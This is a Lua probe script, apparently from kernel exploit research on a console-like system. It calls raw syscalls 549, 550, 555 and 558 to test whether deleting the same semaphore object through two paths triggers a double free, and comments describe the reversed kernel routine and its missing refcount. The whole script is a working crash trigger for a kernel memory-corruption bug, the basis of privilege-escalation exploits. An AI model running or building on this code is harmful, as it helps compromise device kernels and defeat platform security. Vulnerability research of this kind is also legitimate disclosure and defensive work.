-- CRASH_CLASS: HIGH
-- PROBE 810a: does sys 558 free an object that sys 550 already freed?
--
-- 13.60 body at offset 0xac73c0: lookup(table=proc+0xc48, id, flags|0x1000) -> rbx; remove; unlock;
-- free([rbx]); free(rbx).  One lookup, no refcount, no re-lookup.  549/550 manage the same
-- proc+0xc48 table for osem.  If 550's removal is not visible to 558's lookup, the second call
-- frees the same object again.
print("=== PROBE 810a: 558 vs 550 CROSS DELETE ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local getpid = make_syscall(20)
local s549 = make_syscall(549)
local s550 = make_syscall(550)
local s558 = make_syscall(558)
local s553 = make_syscall(553)
local s555 = make_syscall(555)
pcall(function() return getpid() end)
local name = memory.alloc(32)
local s = "probe810a"
for i = 1, #s do pcall(function() memory.write_byte(name + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(name + #s, 0) end)
local function call(f, ...)
    local ok, r = pcall(f, ...)
    if not ok then return "pcall" end
    return to_num(r)
end
local function mk(id) return call(s549, uint64(name), uint64(id), uint64(0), uint64(4)) end
print("[A] create four objects")
local ids = {}
for i = 1, 4 do
    ids[i] = mk(i)
    print(string.format("  create #%d -> %s", i, tostring(ids[i])))
end
print("")
print("[B] 550 first, then 558 on the same id")
local r1 = call(s550, uint64(ids[1]), uint64(0), uint64(0))
print("  550(id1) = " .. tostring(r1))
local r2 = call(s558, uint64(ids[1]), uint64(0))
print("  558(id1) = " .. tostring(r2) .. ((r2 == 0) and "   <-- FREED AGAIN" or ""))
print("")
print("[C] 558 first, then 550")
local r3 = call(s558, uint64(ids[2]), uint64(0))
print("  558(id2) = " .. tostring(r3))
local r4 = call(s550, uint64(ids[2]), uint64(0), uint64(0))
print("  550(id2) = " .. tostring(r4) .. ((r4 == 0) and "   <-- FREED AGAIN" or ""))
print("")
print("[D] 558 on an object we keep alive, twice")
local r5 = call(s558, uint64(ids[3]), uint64(0))
print("  558(id3) = " .. tostring(r5))
local r6 = call(s558, uint64(ids[3]), uint64(0))
print("  558(id3) again = " .. tostring(r6))
print("")
print("[E] 558 on a non-object id and on 0")
print("  558(0xDEAD) = " .. tostring(call(s558, uint64(0xDEAD), uint64(0))))
print("  558(0) = " .. tostring(call(s558, uint64(0), uint64(0))))
print("")
print("[F] the surviving object still works?")
local r7 = call(s555, uint64(ids[4]), uint64(0), uint64(0))
print("  555(id4) post = " .. tostring(r7))
print("")
print("[G] alive pid=" .. to_num(getpid()))
